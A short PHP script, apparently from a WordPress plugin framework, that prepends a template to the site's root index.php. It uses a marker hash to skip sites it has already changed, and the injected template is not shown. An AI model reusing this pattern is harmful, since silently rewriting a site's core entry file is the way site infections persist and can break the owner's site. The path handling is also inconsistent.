<?php

use boctulus\SW\core\libs\Logger;
use boctulus\SW\core\libs\Plugins;
use boctulus\SW\core\libs\Strings;

/*
    Este script es incluido desde el index del plugin
*/

if (!defined('CORE_PATH')){
    return;
}

try {
    $content = file_get_contents(CORE_PATH . 'templates/wp_index_addon.php');
    $index   = file_get_contents(ABSPATH . DIRECTORY_SEPARATOR . 'index.php');

    if (Strings::contains ('fae0b27c451c728867a567e8c1bb4e53', $index)){
        return;
    }

    $content = str_replace('__PLUGIN_NAME__', Plugins::currentName(), $content);
    $index   = substr($index, 5);
    $index   = $content . $index;

    $bytes = file_put_contents(ABSPATH . '\index.php', $index); 
} catch (\Exception $e) {
    Logger::logError($e->getMessage());
    return false;
}


return ($bytes > 0);

